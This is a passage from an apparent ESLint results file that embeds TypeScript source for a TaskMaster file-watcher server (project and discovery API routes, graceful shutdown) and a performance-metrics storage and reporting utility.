watcher = watch(sanitizedPath, async (eventType) => {\n      if (eventType === 'change') {\n        try {\n          const content = await readFile(sanitizedPath, 'utf8');\n          \n          // Validate JSON structure\n          let data;\n          try {\n            data = JSON.parse(content);\n          } catch {\n            console.error(`Invalid JSON in file: ${sanitizedPath}`);\n            return;\n          }\n          \n          // Update project data\n          const project = projects.get(projectId);\n          if (project) {\n            projects.set(projectId, {\n              ...project,\n              data,\n              lastUpdated: new Date().toISOString()\n            });\n            \n            // Broadcast to clients\n            broadcastUpdate(projectId, data);\n            console.log(`ðŸ“Š Updated ${projectId}: ${data.tasks?.length || 0} tasks`);\n          }\n        } catch (error) {\n          console.error(`Error reading ${sanitizedPath}:`, error);\n        }\n      }\n    });\n    \n    fileWatchers.set(projectId, watcher);\n  } catch (error) {\n    throw new Error(`Failed to watch file: ${error instanceof Error ? error.message : 'Unknown error'}`);\n  }\n}\n\n// API Routes with enhanced security\n\n// Add a new project to watch\napp.post('/api/projects', validateInput(ProjectSchema), async (req: Request, res: Response) => {\n  try {\n    const { id, name, path: projectPath } = req.body;\n    \n    // Check if project already exists\n    if (projects.has(id)) {\n      res.status(409).json({ error: 'Project with this ID already exists' });\n      return;\n    }\n    \n    const tasksFilePath = path.join(projectPath, 'tasks', 'tasks.json');\n    const sanitizedTasksPath = sanitizeFilePath(tasksFilePath);\n    \n    if (!sanitizedTasksPath) {\n      res.status(400).json({ error: 'Invalid tasks file path' });\n      return;\n    }\n    \n    // Check if tasks.json exists and is readable\n    try {\n      await access(sanitizedTasksPath);\n    } catch {\n      res.status(404).json({ error: 'Tasks file not found or not accessible' });\n      return;\n    }\n    \n    // Read and validate initial data\n    const content = await readFile(sanitizedTasksPath, 'utf8');\n    let data;\n    try {\n      data = JSON.parse(content);\n    } catch {\n      res.status(400).json({ error: 'Invalid JSON in tasks file' });\n      return;\n    }\n    \n    // Store project info\n    const project: Project = {\n      id,\n      name,\n      path: projectPath,\n      tasksFilePath: sanitizedTasksPath,\n      data,\n      lastUpdated: new Date().toISOString()\n    };\n    \n    projects.set(id, project);\n    \n    // Start watching\n    watchTasksFile(id, sanitizedTasksPath);\n    \n    res.json({ success: true, project });\n  } catch (error) {\n    handleError(error, req, res);\n  }\n});\n\n// Get all projects\napp.get('/api/projects', (req: Request, res: Response) => {\n  try {\n    const projectList = Array.from(projects.values()).map(project => ({\n      id: project.id,\n      name: project.name,\n      path: project.path,\n      taskCount: project.data?.tasks?.length || 0,\n      lastUpdated: project.lastUpdated\n    }));\n    \n    res.json(projectList);\n  } catch (error) {\n    handleError(error, req, res);\n  }\n});\n\n// Get specific project data\napp.get('/api/projects/:id', (req: Request, res: Response) => {\n  try {\n    const projectId = req.params.id;\n    \n    if (!projectId) {\n      res.status(400).json({ error: 'Project ID is required' });\n      return;\n    }\n    \n    // Validate project ID\n    if (!/^[a-zA-Z0-9_-]+$/.test(projectId)) {\n      res.status(400).json({ error: 'Invalid project ID format' });\n      return;\n    }\n    \n    const project = projects.get(projectId);\n    if (!project) {\n      res.status(404).json({ error: 'Project not found' });\n      return;\n    }\n    \n    res.json(project);\n  } catch (error) {\n    handleError(error, req, res);\n  }\n});\n\n// Remove project\napp.delete('/api/projects/:id', (req: Request, res: Response) => {\n  try {\n    const projectId = req.params.id;\n    \n    if (!projectId) {\n      res.status(400).json({ error: 'Project ID is required' });\n      return;\n    }\n    \n    // Validate project ID\n    if (!/^[a-zA-Z0-9_-]+$/.test(projectId)) {\n      res.status(400).json({ error: 'Invalid project ID format' });\n      return;\n    }\n    \n    // Close file watcher\n    if (fileWatchers.has(projectId)) {\n      fileWatchers.get(projectId)?.close();\n      fileWatchers.delete(projectId);\n    }\n    \n    // Remove project\n    const deleted = projects.delete(projectId);\n    \n    if (!deleted) {\n      res.status(404).json({ error: 'Project not found' });\n      return;\n    }\n    \n    res.json({ success: true });\n  } catch (error) {\n    handleError(error, req, res);\n  }\n});\n\n// Discovery Routes with enhanced security\n\n// Start auto-discovery\napp.post('/api/discovery/start', validateInput(DiscoveryOptionsSchema), async (req: Request, res: Response) => {\n  try {\n    const options = req.body || {};\n    \n    if (discoveryEngine.isScanning()) {\n      res.status(409).json({ error: 'Discovery already in progress' });\n      return;\n    }\n\n    // Set up progress broadcasting with error handling\n    discoveryEngine.onProgress((progress: any) => {\n      const message: DiscoveryProgress = {\n        type: 'discoveryProgress',\n        progress\n      };\n      \n      connections.forEach(ws => {\n        if (ws.readyState === WebSocket.OPEN) {\n          try {\n            ws.send(JSON.stringify(message));\n          } catch (error) {\n            console.error('Error sending progress update:', error);\n            connections.delete(ws);\n          }\n        }\n      });\n    });\n\n    // Start discovery in background\n    discoveryEngine.runFullDiscovery(options)\n      .then((discoveredProjects: any) => {\n        const message: DiscoveryProgress = {\n          type: 'discoveryComplete',\n          projects: discoveredProjects\n        };\n        \n        connections.forEach(ws => {\n          if (ws.readyState === WebSocket.OPEN) {\n            try {\n              ws.send(JSON.stringify(message));\n            } catch (error) {\n              console.error('Error sending completion update:', error);\n              connections.delete(ws);\n            }\n          }\n        });\n      })\n      .catch((error: any) => {\n        console.error('Discovery failed:', error);\n        \n        const message: DiscoveryProgress = {\n          type: 'discoveryError',\n          error: 'Discovery process failed'\n        };\n        \n        connections.forEach(ws => {\n          if (ws.readyState === WebSocket.OPEN) {\n            try {\n              ws.send(JSON.stringify(message));\n            } catch (error) {\n              console.error('Error sending error update:', error);\n              connections.delete(ws);\n            }\n          }\n        });\n      });\n\n    res.json({ \n      success: true, \n      message: 'Discovery started',\n      progress: discoveryEngine.getProgress()\n    });\n  } catch (error) {\n    handleError(error, req, res);\n  }\n});\n\n// Get discovery status\napp.get('/api/discovery/status', (req: Request, res: Response) => {\n  try {\n    res.json({\n      isScanning: discoveryEngine.isScanning(),\n      progress: discoveryEngine.getProgress(),\n      discoveredCount: discoveryEngine.getDiscoveredProjects().length\n    });\n  } catch (error) {\n    handleError(error, req, res);\n  }\n});\n\n// Get discovered projects\napp.get('/api/discovery/projects', (req: Request, res: Response) => {\n  try {\n    const discoveredProjects = discoveryEngine.getDiscoveredProjects();\n    res.json(discoveredProjects);\n  } catch (error) {\n    handleError(error, req, res);\n  }\n});\n\n// Auto-add discovered projects\napp.post('/api/discovery/add-selected', validateInput(ProjectIdsSchema), async (req: Request, res: Response) => {\n  try {\n    const { projectIds } = req.body;\n    \n    const discoveredProjects = discoveryEngine.getDiscoveredProjects();\n    const results: Array<{ id: string; success: boolean; error?: string }> = [];\n\n    for (const projectId of projectIds) {\n      const discoveredProject = discoveredProjects.find((p: any) => p.id === projectId);\n      \n      if (!discoveredProject) {\n        results.push({ id: projectId, success: false, error: 'Project not found' });\n        continue;\n      }\n\n      try {\n        // Validate file path\n        const sanitizedTasksFile = sanitizeFilePath(discoveredProject.tasksFile);\n        if (!sanitizedTasksFile) {\n          results.push({ id: projectId, success: false, error: 'Invalid tasks file path' });\n          continue;\n        }\n        \n        // Check if tasks.json exists and is readable\n        const content = await readFile(sanitizedTasksFile, 'utf8');\n        let data;\n        try {\n          data = JSON.parse(content);\n        } catch {\n          results.push({ id: projectId, success: false, error: 'Invalid JSON in tasks file' });\n          continue;\n        }\n        \n        // Add to projects\n        const project: Project = {\n          ...discoveredProject,\n          tasksFilePath: sanitizedTasksFile,\n          data,\n          lastUpdated: new Date().toISOString()\n        };\n        \n        projects.set(discoveredProject.id, project);\n        \n        // Start watching\n        watchTasksFile(discoveredProject.id, sanitizedTasksFile);\n        \n        results.push({ id: projectId, success: true });\n        console.log(`ðŸ“Š Auto-added project: ${discoveredProject.name}`);\n      } catch {\n        results.push({ \n          id: projectId, \n          success: false, \n          error: 'Failed to add project' \n        });\n      }\n    }\n\n    res.json({ results });\n  } catch (error) {\n    handleError(error, req, res);\n  }\n});\n\n// Health check endpoint\napp.get('/api/health', (req: Request, res: Response) => {\n  res.json({\n    status: 'healthy',\n    projectCount: projects.size,\n    connections: connections.size,\n    discoveryActive: discoveryEngine.isScanning(),\n    uptime: process.uptime(),\n    timestamp: new Date().toISOString()\n  });\n});\n\n// Add Claude Configuration API\naddClaudeConfigAPI(app);\n\n// Global error handler\napp.use((error: any, req: Request, res: Response) => {\n  handleError(error, req, res);\n});\n\n// 404 handler\napp.use((req: Request, res: Response) => {\n  res.status(404).json({\n    error: 'Endpoint not found',\n    path: req.path,\n    timestamp: new Date().toISOString()\n  });\n});\n\nconst PORT = process.env.PORT || 3001;\n\nserver.listen(PORT, () => {\n  console.log(`ðŸš€ TaskMaster File Watcher Server running on http://localhost:${PORT}`);\n  console.log(`ðŸ“ Watching ${projects.size} projects`);\n  console.log(`ðŸ”’ Security features enabled: Helmet, CORS, Rate Limiting, Input Validation`);\n});\n\n// Enhanced graceful shutdown\nfunction gracefulShutdown(signal: string) {\n  console.log(`\\nðŸ›‘ Received ${signal}, shutting down gracefully...`);\n  \n  // Close all file watchers\n  console.log('ðŸ“ Closing file watchers...');\n  fileWatchers.forEach((watcher, projectId) => {\n    try {\n      watcher.close();\n      console.log(`  âœ“ Closed watcher for project: ${projectId}`);\n    } catch (error) {\n      console.error(`  âœ— Error closing watcher for ${projectId}:`, error);\n    }\n  });\n  \n  // Close WebSocket connections\n  console.log('ðŸ”Œ Closing WebSocket connections...');\n  connections.forEach(ws => {\n    try {\n      ws.close(1000, 'Server shutting down');\n    } catch (error) {\n      console.error('Error closing WebSocket connection:', error);\n    }\n  });\n  \n  // Close WebSocket server\n  wss.close(() => {\n    console.log('âœ“ WebSocket server closed');\n  });\n  \n  // Close HTTP server\n  server.close(() => {\n    console.log('âœ“ HTTP server closed');\n    console.log('ðŸŽ¯ Graceful shutdown complete');\n    process.exit(0);\n  });\n  \n  // Force close after timeout\n  setTimeout(() => {\n    console.error('âŒ Forced shutdown after timeout');\n    process.exit(1);\n  }, 10000);\n}\n\nprocess.on('SIGINT', () => gracefulShutdown('SIGINT'));\nprocess.on('SIGTERM', () => gracefulShutdown('SIGTERM'));\n\n// Handle uncaught exceptions\nprocess.on('uncaughtException', (error) => {\n  console.error('Uncaught Exception:', error);\n  gracefulShutdown('uncaughtException');\n});\n\nprocess.on('unhandledRejection', (reason, promise) => {\n  console.error('Unhandled Rejection at:', promise, 'reason:', reason);\n  gracefulShutdown('unhandledRejection');\n});\n\nexport default app;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/lib/performance-database.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":667,"column":38,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":667,"endColumn":41,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[18418,18421],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[18418,18421],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":1,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Performance Database Utilities\n * \n * TypeScript utilities for managing performance monitoring data\n * Provides type-safe interfaces for metrics storage and retrieval\n * \n * Follows 2025 best practices:\n * - Time-series data structures\n * - Type-safe database operations\n * - Efficient data aggregation\n * - Memory-optimized storage\n */\n\nimport * as fs from 'fs/promises';\nimport * as path from 'path';\n\nexport interface PerformanceMetric {\n  timestamp: number;\n  system: SystemMetrics;\n  application?: ApplicationMetrics;\n  metadata: MetricMetadata;\n}\n\nexport interface SystemMetrics {\n  cpu: {\n    usage: number;\n    loadAverage: number[];\n    cores: number;\n  };\n  memory: {\n    total: number;\n    free: number;\n    used: number;\n    usagePercent: number;\n    process: {\n      heapUsed: number;\n      heapTotal: number;\n      external: number;\n      rss: number;\n    };\n  };\n  uptime: number;\n}\n\nexport interface ApplicationMetrics {\n  rendering: {\n    fps: number;\n    jank: number;\n    paintTime: number;\n  };\n  network: {\n    requestCount: number;\n    avgLatency: number;\n    errorRate: number;\n  };\n  errors: {\n    count: number;\n    types: string[];\n  };\n}\n\nexport interface MetricMetadata {\n  platform: string;\n  arch: string;\n  nodeVersion: string;\n  monitorVersion: string;\n}\n\nexport interface PerformanceAlert {\n  type: string;\n  severity: 'warning' | 'critical';\n  value: number;\n  threshold: number;\n  message: string;\n  timestamp: number;\n}\n\nexport interface DynamicThreshold {\n  warning: number;\n  critical: number;\n  baseline: {\n    mean: number;\n    p50: number;\n    p75: number;\n    p90: number;\n    stdDev: number;\n  };\n}\n\nexport interface AggregatedMetrics {\n  timeRange: string;\n  sampleCount: number;\n  cpu: MetricAggregation;\n  memory: MetricAggregation;\n  fps: MetricAggregation;\n  alerts: PerformanceAlert[];\n  data: PerformanceMetric[];\n}\n\nexport interface MetricAggregation {\n  avg: number;\n  max: number;\n  min: number;\n  p95?: number;\n  trend?: 'increasing' | 'decreasing' | 'stable';\n}\n\nexport interface DatabaseConfig {\n  dataDir: string;\n  retentionDays: number;\n  compressionEnabled: boolean;\n  maxMemoryCache: number;\n}\n\nexport class PerformanceDatabase {\n  private config: DatabaseConfig;\n  private memoryCache: Map<string, PerformanceMetric[]>;\n  private cacheSize: number;\n  private indexCache: Map<string, number[]>;\n\n  constructor(config: Partial<DatabaseConfig> = {}) {\n    this.config = {\n      dataDir: path.join(process.cwd(), '.taskmaster/performance'),\n      retentionDays: 30,\n      compressionEnabled: true,\n      maxMemoryCache: 10000,\n      ...config\n    };\n\n    this.memoryCache = new Map();\n    this.cacheSize = 0;\n    this.indexCache = new Map();\n    \n    this.initializeDatabase();\n  }\n\n  private async initializeDatabase(): Promise<void> {\n    try {\n      await fs.mkdir(this.config.dataDir, { recursive: true });\n      await fs.mkdir(path.join(this.config.dataDir, 'daily'), { recursive: true });\n      await fs.mkdir(path.join(this.config.dataDir, 'hourly'), { recursive: true });\n      await fs.mkdir(path.join(this.config.dataDir, 'aggregated'), { recursive: true });\n      await fs.mkdir(path.join(this.config.dataDir, 'indexes'), { recursive: true });\n    } catch (error) {\n      console.error('Failed to initialize performance database:', error);\n      throw error;\n    }\n  }\n\n  /**\n   * Store a performance metric\n   */\n  async storeMetric(metric: PerformanceMetric): Promise<void> {\n    const date = new Date(metric.timestamp);\n    const dateKey = this.getDateKey(date);\n    const hourKey = this.getHourKey(date);\n\n    try {\n      // Store in daily file\n      await this.appendToFile('daily', dateKey, metric);\n      \n      // Store in hourly file for faster queries\n      await this.appendToFile('hourly', hourKey, metric);\n      \n      // Update memory cache\n      this.updateMemoryCache(dateKey, metric);\n      \n      // Update indexes\n      await this.updateIndexes(metric);\n      \n    } catch (error) {\n      console.error('Failed to store metric:', error);\n      throw error;\n    }\n  }\n\n  /**\n   * Retrieve metrics for a time range\n   */\n  async getMetrics(\n    startTime: number, \n    endTime: number, \n    granularity: 'raw' | 'hourly' | 'daily' = 'raw'\n  ): Promise<PerformanceMetric[]> {\n    const startDate = new Date(startTime);\n    const endDate = new Date(endTime);\n    const metrics: PerformanceMetric[] = [];\n\n    try {\n      if (granularity === 'hourly') {\n        const hours = this.getHourRange(startDate, endDate);\n        for (const hour of hours) {\n          const hourlyMetrics = await this.loadFromFile('hourly', hour);\n          metrics.push(...hourlyMetrics.filter(m => \n            m.timestamp >= startTime && m.timestamp <= endTime\n          ));\n        }\n      } else {\n        const days = this.getDateRange(startDate, endDate);\n        for (const day of days) {\n          // Check memory cache first\n          if (this.memoryCache.has(day)) {\n            const cachedMetrics = this.memoryCache.get(day)!;\n            metrics.push(...cachedMetrics.filter(m => \n              m.timestamp >= startTime && m.timestamp <= endTime\n            ));\n          } else {\n            const dailyMetrics = await this.loadFromFile('daily', day);\n            metrics.push(...dailyMetrics.filter(m => \n              m.timestamp >= startTime && m.timestamp <= endTime\n            ));\n          }\n        }\n      }\n\n      return metrics.sort((a, b) => a.timestamp - b.timestamp);\n    } catch (error) {\n      console.error('Failed to retrieve metrics:', error);\n      throw error;\n    }\n  }\n\n  /**\n   * Get aggregated metrics for dashboard display\n   */\n  async getAggregatedMetrics(\n    startTime: number,\n    endTime: number,\n    timeRange: string = '1h'\n  ): Promise<AggregatedMetrics> {\n    const metrics = await this.getMetrics(startTime, endTime);\n    \n    if (metrics.length === 0) {\n      return this.getEmptyAggregation(timeRange);\n    }\n\n    const cpuValues = metrics.map(m => m.system.cpu.usage).filter(v => !isNaN(v));\n    const memoryValues = metrics.map(m => m.system.memory.usagePercent).filter(v => !isNaN(v));\n    const fpsValues = metrics\n      .map(m => m.application?.rendering?.fps)\n      .filter(v => v !== undefined && !isNaN(v)) as number[];\n\n    return {\n      timeRange,\n      sampleCount: metrics.length,\n      cpu: this.calculateAggregation(cpuValues),\n      memory: this.calculateAggregation(memoryValues),\n      fps: fpsValues.length > 0 ? this.calculateAggregation(fpsValues) : this.getEmptyMetricAggregation(),\n      alerts: [], // Would be loaded separately\n      data: metrics\n    };\n  }\n\n  /**\n   * Store performance alert\n   */\n  async storeAlert(alert: PerformanceAlert): Promise<void> {\n    const alertsFile = path.join(this.config.dataDir, 'alerts.json');\n    \n    try {\n      let alerts: PerformanceAlert[] = [];\n      \n      try {\n        const existingData = await fs.readFile(alertsFile, 'utf8');\n        alerts = JSON.parse(existingData);\n      } catch {\n        // File doesn't exist yet\n      }\n      \n      alerts.push(alert);\n      \n      // Keep only recent alerts (last 1000)\n      if (alerts.length > 1000) {\n        alerts = alerts.slice(-1000);\n      }\n      \n      await fs.writeFile(alertsFile, JSON.stringify(alerts, null, 2));\n    } catch (error) {\n      console.error('Failed to store alert:', error);\n      throw error;\n    }\n  }\n\n  /**\n   * Get alerts for a time range\n   */\n  async getAlerts(startTime: number, endTime: number): Promise<PerformanceAlert[]> {\n    const alertsFile = path.join(this.config.dataDir, 'alerts.json');\n    \n    try {\n      const data = await fs.readFile(alertsFile, 'utf8');\n      const alerts: PerformanceAlert[] = JSON.parse(data);\n      \n      return alerts.filter(alert => \n        alert.timestamp >= startTime && alert.timestamp <= endTime\n      );\n    } catch {\n      return [];\n    }\n  }\n\n  /**\n   * Generate performance report\n   */\n  async generateReport(\n    startTime: number,\n    endTime: number,\n    options: {\n      includeCharts?: boolean;\n      format?: 'json' | 'html';\n      aggregationLevel?: 'raw' | 'hourly' | 'daily';\n    } = {}\n  ): Promise<string> {\n    const {\n      includeCharts = true,\n      format = 'html',\n      aggregationLevel = 'hourly'\n    } = options;\n\n    const metrics = await this.getMetrics(startTime, endTime, aggregationLevel);\n    const alerts = await this.getAlerts(startTime, endTime);\n    const aggregated = await this.getAggregatedMetrics(startTime, endTime);\n\n    const report = {\n      generatedAt: new Date().toISOString(),\n      timeRange: {\n        start: new Date(startTime).toISOString(),\n        end: new Date(endTime).toISOString(),\n        duration: endTime - startTime\n      },\n      summary: {\n        totalSamples: metrics.length,\n        alertsCount: alerts.length,\n        avgCPU: aggregated.cpu.avg,\n        avgMemory: aggregated.memory.avg,\n        avgFPS: aggregated.fps.avg\n      },\n      metrics: aggregationLevel === 'raw' ? metrics : metrics.slice(0, 1000), // Limit for large reports\n      alerts,\n      aggregated,\n      recommendations: this.generateRecommendations(aggregated, alerts)\n    };\n\n    if (format === 'json') {\n      return JSON.stringify(report, null, 2);\n    } else {\n      return this.generateHTMLReport(report, includeCharts);\n    }\n  }\n\n  /**\n   * Clean up old data files\n   */\n  async cleanup(): Promise<void> {\n    const cutoffDate = new Date();\n    cutoffDate.setDate(cutoffDate.getDate() - this.config.retentionDays);\n\n    try {\n      // Clean daily files\n      await this.cleanupDirectory('daily', cutoffDate);\n      \n      // Clean hourly files\n      await this.cleanupDirectory('hourly', cutoffDate);\n      \n      // Clean memory cache\n      this.cleanupMemoryCache(cutoffDate);\n      \n      console.log(`Cleaned up performance data older than ${this.config.retentionDays} days`);\n    } catch (error) {\n      console.error('Failed to cleanup performance data:', error);\n      throw error;\n    }\n  }\n\n  /**\n   * Get database statistics\n   */\n  async getStatistics(): Promise<{\n    totalMetrics: number;\n    oldestMetric: number;\n    newestMetric: number;\n    diskUsage: number;\n    cacheSize: number;\n  }> {\n    let totalMetrics = 0;\n    let oldestMetric = Date.now();\n    let newestMetric = 0;\n    let diskUsage = 0;\n\n    try {\n      // Count daily files\n      const dailyDir = path.join(this.config.dataDir, 'daily');\n      const files = await fs.readdir(dailyDir);\n      \n      for (const file of files) {\n        if (file.endsWith('.json')) {\n          const filePath = path.join(dailyDir, file);\n          const stats = await fs.stat(filePath);\n          diskUsage += stats.size;\n          \n          try {\n            const data = await fs.readFile(filePath, 'utf8');\n            const metrics: PerformanceMetric[] = JSON.parse(data);\n            totalMetrics += metrics.length;\n            \n            if (metrics.length > 0) {\n              const firstMetric = metrics[0];\n              const lastMetric = metrics[metrics.length - 1];\n              if (firstMetric !== undefined) {\n                oldestMetric = Math.min(oldestMetric, firstMetric.timestamp);\n              }\n              if (lastMetric !== undefined) {\n                newestMetric = Math.max(newestMetric, lastMetric.timestamp);\n              }\n            }\n          } catch {\n            // Skip invalid files\n          }\n        }\n      }\n\n      return {\n        totalMetrics,\n        oldestMetric,\n        newestMetric,\n        diskUsage,\n        cacheSize: this.cacheSize\n      };\n    } catch (error) {\n      console.error('Failed to get database statistics:', error);\n      throw error;\n    }\n  }\n\n  // Private helper methods\n\n  private getDateKey(date: Date): string {\n    const parts = date.toISOString().split('T');\n    return parts[0] ?? '';\n  }\n\n  private getHourKey(date: Date): string {\n    const isoString = date.toISOString();\n    return isoString.substring(0, 13); // YYYY-MM-DDTHH\n  }\n\n  private getDateRange(startDate: Date, endDate: Date): string[] {\n    const dates: string[] = [];\n    const current = new Date(startDate);\n    \n    while (current <= endDate) {\n      dates.push(this.getDateKey(current));\n      current.setDate(current.getDate() + 1);\n    }\n    \n    return dates;\n  }\n\n  private getHourRange(startDate: Date, endDate: Date): string[] {\n    const hours: string[] = [];\n    const current = new Date(startDate);\n    current.setMinutes(0, 0, 0);\n    \n    while (current <= endDate) {\n      hours.push(this.getHourKey(current));\n      current.setHours(current.getHours() + 1);\n    }\n    \n    return hours;\n  }\n\n  private async appendToFile(\n    directory: string,\n    key: string,\n    metric: PerformanceMetric\n  ): Promise<void> {\n    const filePath = path.join(this.config.dataDir, directory, `${key}.json`);\n    \n    let metrics: PerformanceMetric[] = [];\n    \n    try {\n      const existingData = await fs.readFile(filePath, 'utf8');\n      metrics = JSON.parse(existingData);\n    } catch {\n      // File doesn't exist yet\n    }\n    \n    metrics.push(metric);\n    \n    // Sort by timestamp to maintain order\n    metrics.sort((a, b) => a.timestamp - b.timestamp);\n    \n    await fs.writeFile(filePath, JSON.stringify(metrics, null, 2));\n  }\n\n  private async loadFromFile(directory: string, key: string): Promise<PerformanceMetric[]> {\n    const filePath = path.join(this.config.dataDir, directory, `${key}.json`);\n    \n    try {\n      const data = await fs.readFile(filePath, 'utf8');\n      return JSON.parse(data);\n    } catch {\n      return [];\n    }\n  }\n\n  private updateMemoryCache(key: string, metric: PerformanceMetric): void {\n    if (!this.memoryCache.has(key)) {\n      this.memoryCache.set(key, []);\n    }\n    \n    const cached = this.memoryCache.get(key)!;\n    cached.push(metric);\n    this.cacheSize++;\n    \n    // Limit cache size\n    if (this.cacheSize > this.config.maxMemoryCache) {\n      this.evictOldestCache();\n    }\n  }\n\n  private evictOldestCache(): void {\n    const keys = Array.from(this.memoryCache.keys()).sort();\n    const oldestKey = keys[0];\n    \n    if (oldestKey) {\n      const evicted = this.memoryCache.get(oldestKey)!;\n      this.cacheSize -= evicted.length;\n      this.memoryCache.delete(oldestKey);\n    }\n  }\n\n  private cleanupMemoryCache(cutoffDate: Date): void {\n    const cutoffKey = this.getDateKey(cutoffDate);\n    \n    for (const [key] of this.memoryCache) {\n      if (key < cutoffKey) {\n        const evicted = this.memoryCache.get(key)!;\n        this.cacheSize -= evicted.length;\n        this.memoryCache.delete(key);\n      }\n    }\n  }\n\n  private async cleanupDirectory(directory: string, cutoffDate: Date): Promise<void> {\n    const dirPath = path.join(this.config.dataDir, directory);\n    const files = await fs.readdir(dirPath);\n    const cutoffKey = this.getDateKey(cutoffDate);\n    \n    for (const file of files) {\n      if (file.endsWith('.json')) {\n        const fileKey = file.replace('.json', '');\n        if (fileKey < cutoffKey) {\n          await fs.unlink(path.join(dirPath, file));\n        }\n      }\n    }\n  }\n\n  private async updateIndexes(metric: PerformanceMetric): Promise<void> {\n    // Simple time-based index for now\n    // Could be extended with more sophisticated indexing\n    const hourKey = this.getHourKey(new Date(metric.timestamp));\n    \n    if (!this.indexCache.has(hourKey)) {\n      this.indexCache.set(hourKey, []);\n    }\n    \n    this.indexCache.get(hourKey)!.push(metric.timestamp);\n  }\n\n  private calculateAggregation(values: number[]): MetricAggregation {\n    if (values.length === 0) {\n      return this.getEmptyMetricAggregation();\n    }\n    \n    const sorted = values.slice().sort((a, b) => a - b);\n    const sum = values.reduce((a, b) => a + b, 0);\n    const p95Index = Math.floor(sorted.length * 0.95);\n    \n    // Calculate trend\n    let trend: 'increasing' | 'decreasing' | 'stable' = 'stable';\n    if (values.length > 10) {\n      const firstHalf = values.slice(0, Math.floor(values.length / 2));\n      const secondHalf = values.slice(Math.floor(values.length / 2));\n      const firstAvg = firstHalf.reduce((a, b) => a + b, 0) / firstHalf.length;\n      const secondAvg = secondHalf.reduce((a, b) => a + b, 0) / secondHalf.length;\n      const difference = secondAvg - firstAvg;\n      const threshold = firstAvg * 0.05; // 5% threshold\n      \n      if (difference > threshold) {\n        trend = 'increasing';\n      } else if (difference < -threshold) {\n        trend = 'decreasing';\n      }\n    }\n    \n    return {\n      avg: sum / values.length,\n      max: Math.max(...values),\n      min: Math.min(...values),\n      p95: sorted[p95Index],\n      trend\n    };\n  }\n\n  private getEmptyMetricAggregation(): MetricAggregation {\n    return {\n      avg: 0,\n      max: 0,\n      min: 0,\n      p95: 0,\n      trend: 'stable'\n    };\n  }\n\n  private getEmptyAggregation(timeRange: string): AggregatedMetrics {\n    return {\n      timeRange,\n      sampleCount: 0,\n      cpu: this.getEmptyMetricAggregation(),\n      memory: this.getEmptyMetricAggregation(),\n      fps: this.getEmptyMetricAggregation(),\n      alerts: [],\n      data: []\n    };\n  }\n\n  private generateRecommendations(\n    aggregated: AggregatedMetrics,\n    alerts: PerformanceAlert[]\n  ): string[] {\n    const recommendations: string[] = [];\n    \n    // CPU recommendations\n    if (aggregated.cpu.avg > 70) {\n      recommendations.push('Consider optimizing CPU-intensive operations or upgrading hardware');\n    }\n    \n    if (aggregated.cpu.trend === 'increasing') {\n      recommendations.push('CPU usage is trending upward - monitor for potential performance issues');\n    }\n    \n    // Memory recommendations\n    if (aggregated.memory.avg > 80) {\n      recommendations.push('High memory usage detected - check for memory leaks');\n    }\n    \n    if (aggregated.memory.trend === 'increasing') {\n      recommendations.push('Memory usage is increasing over time - potential memory leak');\n    }\n    \n    // FPS recommendations\n    if (aggregated.fps.avg < 45) {\n      recommendations.push('Low frame rate detected - optimize rendering performance');\n    }\n    \n    // Alert-based recommendations\n    const criticalAlerts = alerts.filter(a => a.severity === 'critical');\n    if (criticalAlerts.length > 0) {\n      recommendations.push(`${criticalAlerts.length} critical performance issues detected - immediate attention required`);\n    }\n    \n    return recommendations;\n  }\n\n  private generateHTMLReport(report: any, includeCharts: boolean): string {\n    // Generate HTML report (simplified version)\n    return `\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Performance Report</title>\n  <style>\n    body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }\n    .header { background: #1a1a1a; color: white; padding: 20px; border-radius: 8px; }\n    .section { background: white; padding: 20px; margin: 20px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }\n    .metric { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; }\n    .good { color: #10b981; }\n    .warning { color: #f59e0b; }\n    .critical { color: #ef4444; }\n  </style>\n  ${includeCharts ? '<script src=\"https://cdn.jsdelivr.net/npm/chart.js\"></script>' : ''}\n</head>\n<body>\n  <div class=\"header\">\n    <h1>Performance Report</h1>\n    <p>Generated: ${report.generatedAt}</p>\n    <p>Time Range: ${report.timeRange.start} to ${report.timeRange.end}</p>\n  </div>\n  \n  <div class=\"section\">\n    <h2>Summary</h2>\n    <div class=\"metric\">\n      <span>Total Samples:</span>\n      <span>${report.summary.totalSamples}</span>\n    </div>\n    <div class=\"metric\">\n      <span>Alerts:</span>\n      <span class=\"${report.summary.alertsCount > 0 ? 'warning' : 'good'}\">${report.summary.alertsCount}</span>\n    </div>\n    <div class=\"metric\">\n      <span>Average CPU:</span>\n      <span class=\"${report.summary.avgCPU > 70 ? 'warning' : 'good'}\">${report.summary.avgCPU.toFixed(1)}%</span>\n    </div>\n    <div class=\"metric\">\n      <span>Average Memory:</span>\n      <span class=\"${report.summary.avgMemory > 80 ? 'warning' : 'good'}\">${report.summary.avgMemory.toFixed(1)}%</span>\n    </div>\n    <div class=\"metric\">\n      <span>Average FPS:</span>\n      <span class=\"${report.summary.avgFPS < 45 ? 'warning' : 'good'}\">${report.summary.avgFPS.toFixed(1)}</span>\n    </div>\n  </div>\n  \n  <div class=\"section\">\n    <h2>Recommendations</h2>\n    ${report.recommendations.map((rec: string) => `<p>â€¢ ${rec}</p>`).join('')}\n  </div>\n</body>\n</html>\n    `;\n  }\n}\n\n// Utility functions for external use\nexport function createPerformanceDatabase(config?: Partial<DatabaseConfig>): PerformanceDatabase {\n  return new PerformanceDatabase(config);\n}\n\nexport function calculateMetricTrend(values: number[]): 'increasing' | 'decreasing' | 'stable' {\n  if (values.length < 2) return 'stable';\n  \n  const firstValue = values[0];\n  const lastValue = values[values.length - 1];\n  \n  // Handle cases where array access might be undefined\n  if (firstValue === undefined || lastValue === undefined) {\n    return 'stable';\n  }\n  \n  const change = (lastValue 